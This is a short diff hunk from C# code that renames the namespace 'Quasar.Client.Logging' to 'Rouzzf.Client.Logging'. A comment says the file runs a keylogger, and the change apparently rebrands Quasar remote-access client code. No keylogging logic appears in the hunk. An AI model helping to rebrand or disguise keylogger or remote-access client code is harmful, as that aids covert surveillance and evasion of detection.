@@ -2,7 +2,7 @@
 using System.Threading;
 using System.Windows.Forms;
 
-namespace Quasar.Client.Logging
+namespace Rouzzf.Client.Logging
 {
     /// <summary>
     /// Provides a service to run the keylogger.
